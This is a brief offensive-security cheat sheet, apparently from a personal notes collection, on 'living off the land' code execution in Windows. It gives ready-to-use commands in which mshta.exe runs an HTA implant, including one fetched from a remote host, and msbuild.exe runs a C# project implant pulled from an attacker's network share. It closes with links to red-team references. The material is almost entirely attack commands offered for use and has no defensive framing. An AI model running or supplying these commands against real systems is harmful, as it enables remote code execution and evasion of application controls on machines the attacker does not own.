# Living off the Land

## 01 - MSHTA

```
C:\> mshta.exe %CD%\implant.hta

C:\> mshta.exe <drive_letter>:\absolute\path\to\implant.hta

C:\> mshta.exe http[s]://<IP>/implant.hta
```

## 02 - MSBuild

Execute C# project implants.

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.xml
```

---
## References

### Backlinks

- [[DotNET Execution|Code Execution: MSBuild]]

### Red Team Notes

- [Red Team Notes: Code Execution](https://www.ired.team/offensive-security/code-execution)

### Sevagas

- [Sevagas: Hacking around HTA files](https://blog.sevagas.com/?Hacking-around-HTA-files)

### DMCXBlue

- [DMCXBlue Gitbook: HTA Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-link/links-hta-files)